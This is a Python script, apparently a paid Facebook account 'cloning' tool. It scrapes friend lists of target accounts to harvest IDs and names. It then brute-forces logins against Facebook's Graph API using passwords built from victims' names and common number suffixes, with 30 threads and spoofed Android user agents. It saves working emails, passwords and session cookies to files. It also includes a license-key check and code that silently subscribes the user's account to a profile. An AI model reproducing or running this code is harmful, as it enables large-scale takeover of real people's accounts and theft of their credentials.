
import os
import sys
import time
import requests
os.system('clear')
os.system('rm -rf list.txt')
os.system('BLACK -u > list.txt')
uid = open('list.txt', 'r')
for j in uid:
    sp = j.split()

def chk():

  os.system('pip uninstall requests -y && pip install requests')
  uuid = str(os.geteuid()) + str(os.getlogin()) 

  id = "XC".join(uuid)

  print("\n\n\x1b[37;1m YOUR KEY : \033[94m"+id) 

  try: 

    httpCaht = requests.get("https://raw.githubusercontent.com/Blackhackerx/Idd.txt/main/README.md").text 

    if id in httpCaht: 

      print("\033[92m YOUR KEY IS ACTIVE.........\033[97m") 

      msg = str(os.geteuid()) 

      time.sleep(1) 

      pass 

    else: 

      print("\033[0;96m Bro This Spcript is Paid to Buy Send Chat to Owner Telegram @MR_B_L_4_C_K") 

      os.system('xdg-open  https://t.me/i4mcyber')

      time.sleep(1) 

      sys.exit() 

  except: 

    sys.exit() 

    if name == 'main': 

     print (logo)

     chk()
     

#!/usr/bin/python
import os, requests, re, random, datetime, sys, time, uuid, base64
from concurrent.futures import ThreadPoolExecutor as XD
from bs4 import BeautifulSoup as par

ses=requests.Session()
url="https://mbasic.facebook.com"
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'

id, oks, cps, xnx, pw, loop = [], [], [], [], [], 0
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year

def uas():
    try:
        link = ses.get("https://user-agents.net/applications/dalvik", headers={"user-agent": "chrome"}).text
        cari = re.findall("<li><a href\=\'(.*?)\'\>(.*?)\<\/a\>", link)
        for car in cari:
            if "Dalvik/2.1.0" in str(car):
                xnx.append(car[1]+"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=2.0,width=720,height=1448};FBLC/fr_CA;FBCR/ROGERS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920W8;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;]")
    except:pass

def hapus():
    try:os.remove(".cok.txt");os.remove(".tok.txt")
    except:pass

def clear():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")

def banner():
    clear()
    print("""%s
                   
, ＜￣｀ヽ、　　　　　　／￣＞
　ゝ、　　＼　／⌒ヽ,ノ 　/´
　　　ゝ、　`（ ( ͡° ͜ʖ ͡°) ／
　　 　　>　 　 　,)
　　　　　∠_,,,/ 

                             CODE BY  : HAMA-CYBER
                             Telegram : iam_cyber
                             Github   : Not Yet
                             Team     : 1337
                             Version  : 10.3
 ╔╦══• •✠•❀ XCYBER ❀•✠ • •══╦╗
 ╚╩══• •✠•❀ XCYBER ❀•✠ • •══╩╝
 
---------------------------------------------------------------------
 🎀  Don't Minimize When Clonning
---------------------------------------------------------------------

"""%(P))

def login_cokie():
    banner()
    cok = input("[?] cookie : ")
    try:
        data, data2 = {}, {}
        link = ses.post("https://graph.facebook.com/v16.0/device/login/", data={"access_token": "661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e", "scope": ""}).json()
        kode = link["code"];user = link["user_code"]
        vers = par(ses.get(f"{url}/device", cookies={"cookie": cok}).content, "html.parser")
        item = ["fb_dtsg","jazoest","qr"]
        for x in vers.find_all("input"):
            if x.get("name") in item:
                aset = {x.get("name"):x.get("value")}
                data.update(aset)
        data.update({"user_code":user})
        meta = par(ses.post(url+vers.find("form", method="post").get("action"), data=data, cookies={"cookie": cok}).text, "html.parser")
        xzxz  = meta.find("form",{"method":"post"})
        for x in xzxz("input",{"value":True}):
            try:
                if x["name"] == "__CANCEL__" : pass
                else:data2.update({x["name"]:x["value"]})
            except Exception as e: pass
        xx = ses.post(f"{url}{xzxz['action']}", data=data2, cookies={"cookie":cok}).text
        if "Sukses!" in str(xx):
            tokz = ses.get(f"https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e").json()
            open(".cok.txt", "w").write(cok);open(".tok.txt", "w").write(tokz["access_token"]);maling_pangsit(cok, tokz["access_token"])
            exit(f"\n{H}login berhasil{N}")
        else:exit(f"{M}cookie invalid{N}")
    except Exception as e:exit(e)

def maling_pangsit(cok, tok):
    try:nama = ses.get(f"https://graph.facebook.com/me?fields=name&access_token={tok}", cookies={"cookie": cok}).json()["name"]
    except:print("Cookie invalid bro");time.sleep(3);login_cokie()
    try:
        link = par(ses.get(f"{url}/profile.php?id=100005395413800", cookies={"cookie": cok}).text, "html.parser")
        if "/a/subscriptions/remove" in str(link):
            print(f"\nWelcome {H}{nama}{N} in script MR-BLACKCRACKER")
        elif "/a/subscribe.php" in str(link):
            cari = re.search('/a/subscribe.php(.*?)"', str(link)).group(1).replace("amp;", "")
            ses.get(f"{url}/a/subscribe.php{cari}", cookies={"cookie": cok})
            print(f"\nWelcome {H}{nama}{N} in script Chigozieworldwide")
        else:pass
    except:pass

def dump():
    banner()
    try:cook = {"cookie": open(".cok.txt", "r").read()};tokz = open(".tok.txt", "r").read()
    except FileNotFoundError:login_cokie()
    try:
        cekz = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={tokz}", cookies=cook).json()["name"]
    except KeyError:hapus();print(f"\n[{M}!{N}] Akun mendapat checkpint, silakan masuk dengan akun lain.");time.sleep(3);login_cokie()
    except requests.ConnectionError:exit("\n[!] Tidak ada koneksi")
    try:mmk = int(input('IDS LIMIT '))
    except:mmk = 1
    save_file = input('FILENAME SAVED TO ').replace(" ", "_")
    for mnh in range(mmk):
        mnh +=1
        ids = input('PUT ID %s: '%(mnh))
        try:
            ahh = open(f"/sdcard/{save_file}", "a")
            link = ses.get(f"https://graph.facebook.com/{ids}?fields=friends.fields(id,name).limit(5000)&access_token={tokz}", cookies=cook).json()
            for x in link["friends"]["data"]:
                id.append(x["id"]+"|"+x["name"])
                ahh.write(x["id"]+"|"+x["name"]+"\n")
            ahh.close()
            print('Sucesful id extract')
        except KeyError:
            print("Id not publik");continue
    print('SAVED IDS FILE PATH: /sdcard/'+save_file)
    print(50*'-')
    input('Press enter to back')
    exit("\n run : python CLONE.py")

def Main_():
    clear()
    banner()
    uas()
    print(70*'-')
    print('%s[%s+%s] %sSTATUS %s: %sPREMIUM'%(P,P,P,P,P,H))
    print(f"{S}[+] DATE   : {tgl} {bln} {thn}{S}")
    print(70*'-')
    print('%s[%s01%s] %sFILE CLONE'%(P,P,P,P));time.sleep(0.01)
    print('%s[%s02%s] %sDUMP FILE'%(P,P,P,P));time.sleep(0.01)
    print('%s[%s00%s] %sEXIT%s'%(P,P,P,M,N));time.sleep(1)
    jh = input(P+'['+P+'++'+P+'] MENU  ')
    if jh in ['1','01']:xcrack().xrack()
    elif jh in ['2','02']:dump()
    elif jh in ['0','00']:hapus();exit("exit")
    else:exit('[+] RETURN BACK TO MENU')

class xcrack():

    def __init__(self):
        self.id=[]

    def xrack(self):
        clear()
        banner()
        file = input('ENTER FILE NAME : ')
        try:
            self.id = open(file, "r").read().splitlines()
            self.pasw()
        except FileNotFoundError:
            exit()


    def cek_ua(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {loop}|{len(self.id)} [{R}{len(oks)}{S}={A}{len(cps)}{S}]")
        sys.stdout.flush()
        for pw in psw:
            try:
                ses=requests.Session()
                m = random.choice(['SM-M022G','SM-M115F','SM-M105G','SM-M336B','SM-A013M','SM-N981U','SM-9005','SM-A260F','SM-A102U1','SM-A045F','SGH-I317M','SM-G973F','SM-A516U','SM-G6200'])
                a='Dalvik/2.1.0 (Linux; U; Android '
                b=random.choice(['4.4.2','3.3.1','4.4.4','5.1.1','6.0.1','7.0.1','8.0.1','4.0.3','7.0'])
                G = random.randrange(111111,999999)
                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                fbbv = str(random.randint(111111111,999999999))
                fbrv = str(random.randint(111111111,999999999))
                ua=f'{a} {b}; {m} Build/PPR1.{G}.029;[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/'+'{density=2.0,width=720,height=1448}'+';FBLC/id_ID;FBCR/KOREK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{A};FBSV/{b};FBCA/armeabi-v7a:armeabi;]'
                data = {"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16", "sdk_version": {random.randint(1,26)}, "email": sid, "locale": "id_ID", "password": pw, "sdk": "android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
                head={'X-FB-Friendly-Name':'authenticate','X-FB-Net-HNI': str(random.randint(11111, 99999)),'X-FB-SIM-HNI': str(random.randint(11111, 99999)),'X-FB-Connection-Type':'Mobile.LTE','User-Agent':ua,'Accept-Encoding':'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
                xnxx = ses.post("https://graph.facebook.com/auth/login", params=data, headers=head, allow_redirects=False).json()
                if 'session_key' in xnxx:
                    sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cokz = ";".join(i["name"]+"="+i["value"] for i in xnxx["session_cookies"])
                    coki = (f"sb={sb};{cokz};m_pixel_ratio=1.25;dpr=1.25;wd=448x931;")
                    print(f'\r {H}[HAMACYBER-OK] {sid} | {pw} | {coki}')
                    oks.append(sid)
                    open('/sdcard/HAMACYBEROK.txt','a').write(f"{sid} | {pw} | {coki}\n")
                    break
                elif 'www.facebook.com' in xnxx['error']['message']:
                    #print(f'\r\033[1;31m [CP] {sid} | {ps}')
                    cps.append(sid)
                    open('/sdcard/HAMACYBERCP.txt','a').write(f"{sid} | {pw}\n")
                else:continue
            except requests.exceptions.ConnectionError:time.sleep(3)
        loop+=1

    def methodXD(self, sid, name, psw):
        ua = random.choice(xnx)
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {loop}|{len(self.id)} [{R}{len(oks)}{S}={A}{len(cps)}{S}]")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                version = str(random.randint(6,13))
                fbdm = '{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'}'
                #ua = "[FBAN/"+"FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/"+"FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";FBDM/"+fbdm+";FBLC/"+"fa_IR;FBCR/"+"vodafone_P;FBMF/"+"Vodafone;FBBD/"+"Vodafone;FBPN/"+"com.facebook.katana;FBDV/"+"Vodafone_785;FBSV/"+version+".2.2;FBOP/"+"1;FBCA/"+"armeabi-v7a:armeabi;]"
                ua  = "[FBAN/"+"FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/"+"FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";FBDM/"+fbdm+";FBLC/"+"fa_IR;FBCR/"+";FBMF/"+"LGE;FBBD/"+"lge;FBPN/"+"com.facebook.katana;FBDV/"+"LG-M550;FBSV/"+version+".0;nullFBCA/"+"armeabi-v7a:armeabi;]"
                accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                with requests.Session() as session:
                    data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":sid,"password":ps,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"fa_IR","client_country_code":"IR","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
                headers = {"User-Agent":ua,"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cokz = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    coki = (f"sb={sb};{cokz};m_pixel_ratio=1.25;dpr=1.25;wd=448x931;")
                    print(f'\r {H}[HAMACYBER-OK] {sid} | {ps} | {coki}')
                    oks.append(sid)
                    open('/sdcard/HAMACYBER.txt','a').write(f"{sid} | {ps} | {coki}\n")
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f'\r\033[1;31m [CP] {sid} | {ps}')
                    cps.append(sid)
                    open('/sdcard/HAMACYBERCP.txt','a').write(f"{sid} | {ps}\n")
                else:continue
            loop+=1
        except Exception as e:pass
        except requests.exceptions.ConnectionError:time.sleep(3)


    def pasw(self):
        clear()
        banner()
        print(47*'-')
        print('[1] Fast')
        print('[2] Slow')
        print('[3] normal')
        print(60*'-')
        psw = input('CHOOSE: ')
        if psw =='2':
            clear()
            banner()
            print(60*'-')
            print(f"[+] DATE  :  {tgl} {bln} {thn}")
            print(60*'-')
            print('\033[1;97m[+] TOTAL IDS = \033[92;1m '+str(len(self.id)))
            print("\033[1;97m[+] CLONING HAS STARTED\x1b[0m")
            print("\033[1;97m[+] PROCESSING\x1b[0m")
            print(70*'-')
            with XD(max_workers=30) as world:
                for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
                        sz = name.split(' ')
                        if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 6:
                            pwx = [name, sz[0]+sz[1],sz[0]+sz[1]+"123",sz[0]+sz[0],sz[0]+sz[1],sz[0]+sz[1]+"1234",sz[0]+sz[1]+"12345",sz[0]+sz[1]+"123123",sz[0]+sz[1]+"123321",sz[0]+sz[1]+"1122",sz[0]+sz[1]+"112233","123"+sz[0]+sz[1],"1234"+sz[0]+sz[1],"123456"+sz[0]+sz[1],"123456789"+sz[0]+sz[1],sz[0]+sz[1]+"2000",sz[0]+sz[1]+"2002",sz[0]+sz[1]+"1999",sz[0]+sz[1]+"1998",sz[0]+sz[1]+"1997",sz[0]+sz[1]+"1996",sz[0]+sz[1]+"1995",sz[0]+sz[1]+"1212",sz[0]+sz[1]+"1221",sz[0]+sz[1]+"0750",sz[0]+sz[1]+"1994",sz[0]+sz[1]+"11223344",sz[1]+"2001"]
                        else:
                            pwx = [name, sz[0]+sz[1],sz[0]+sz[1]+"123",sz[0]+sz[0],sz[0]+sz[1],sz[0]+sz[1]+"1234",sz[0]+sz[1]+"12345",sz[0]+sz[1]+"123123",sz[0]+sz[1]+"123321",sz[0]+sz[1]+"1122",sz[0]+sz[1]+"112233","123"+sz[0]+sz[1],"1234"+sz[0]+sz[1],"123456"+sz[0]+sz[1],"123456789"+sz[0]+sz[1],sz[0]+sz[1]+"2000",sz[0]+sz[1]+"2002",sz[0]+sz[1]+"1999",sz[0]+sz[1]+"1998",sz[0]+sz[1]+"1997",sz[0]+sz[1]+"1996",sz[0]+sz[1]+"1995",sz[0]+sz[1]+"1212",sz[0]+sz[1]+"1221",sz[0]+sz[1]+"0750",sz[0]+sz[1]+"1994",sz[0]+sz[1]+"11223344",sz[1]+"2001"]
                        world.submit(self.methodXD, uid, name, pwx)
                    except:pass
        elif psw =='3':
            clear()
            banner()
            print(60*'-')
            print(f"[+] DATE  :  {tgl} {bln} {thn}")
            print(60*'-')
            print('\033[1;97m[+] TOTAL IDS = \033[92;1m '+str(len(self.id)))
            print("\033[1;97m[+] CLONING HAS STARTED\x1b[0m")
            print("\033[1;97m[+] PROCESSING\x1b[0m")
            print(70*'-')
            with XD(max_workers=30) as world:
                for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
                        sz = name.split(' ')
                        if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 6:
                            pwx = [name, sz[0]+sz[1],sz[0]+sz[1]+"123",sz[0]+sz[0],sz[0]+sz[1],sz[0]+sz[1]+"1234",sz[0]+sz[1]+"12345",sz[0]+sz[1]+"123123",sz[0]+sz[1]+"123321",sz[0]+sz[1]+"1122",sz[0]+sz[1]+"112233","123"+sz[0]+sz[1],"1234"+sz[0]+sz[1],"123456"+sz[0]+sz[1],"123456789"+sz[0]+sz[1],sz[0]+sz[1]+"2000",sz[0]+sz[1]+"2002",sz[0]+sz[1]+"1999",sz[0]+sz[1]+"1998",sz[0]+sz[1]+"1997",sz[0]+sz[1]+"1996",sz[0]+sz[1]+"1995",sz[0]+sz[1]+"1212",sz[0]+sz[1]+"1221",sz[0]+sz[1]+"0750",sz[0]+sz[1]+"1994",sz[0]+sz[1]+"11223344",sz[1]+"2001"]
                        else:
                            pwx = [name, sz[0]+sz[1],sz[0]+sz[1]+"123",sz[0]+sz[0],sz[0]+sz[1],sz[0]+sz[1]+"1234",sz[0]+sz[1]+"12345",sz[0]+sz[1]+"123123",sz[0]+sz[1]+"123321",sz[0]+sz[1]+"1122",sz[0]+sz[1]+"112233","123"+sz[0]+sz[1],"1234"+sz[0]+sz[1],"123456"+sz[0]+sz[1],"123456789"+sz[0]+sz[1],sz[0]+sz[1]+"2000",sz[0]+sz[1]+"2002",sz[0]+sz[1]+"1999",sz[0]+sz[1]+"1998",sz[0]+sz[1]+"1997",sz[0]+sz[1]+"1996",sz[0]+sz[1]+"1995",sz[0]+sz[1]+"1212",sz[0]+sz[1]+"1221",sz[0]+sz[1]+"0750",sz[0]+sz[1]+"1994",sz[0]+sz[1]+"11223344",sz[1]+"2001"]
                        world.submit(self.cek_ua, uid, name, pwx)
                    except:pass
        elif psw =='1':
            clear()
            pw = []
            banner()
            print('Put limit between 1 to 40')
            sl = int(input('How many password do you want to add? '))
            clear()
            banner()
            print(f'{S}[Exp:first123,last123,firstlast,etc]')
            print('')
            if sl =='':
                print('\nPut limit between 1 to 40')
            elif sl > 40:
                print('\nPassword limit Should Not Be Greater Than 40')
            else:
                for sr in range(sl):
                    pw.append(input(f'Password {sr+1}: '))
            clear()
            banner()
            print(54*'-')
            print(f"[+] DATE  :  {tgl} {bln} {thn}")
            print(54*'-')
            print('\033[1;97m[+] TOTAL IDS = \033[92;1m '+str(len(self.id)))
            print("\033[1;97m[+] CLONING HAS STARTED\x1b[0m")
            print("\033[1;97m[+] PROCESSING\x1b[0m")
            print(54*'-')
            with XD(max_workers=30) as world:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                       world.submit(self.methodXD, uid, name, pwx)
                   except:pass

if __name__=='__main__':
    #try:os.mkdir('/sdcard/CHIGOZIEOK')
    #except:pass
    #try:os.mkdir('/sdcard/CHIGOZIECP')
    #except:pass
    Main_()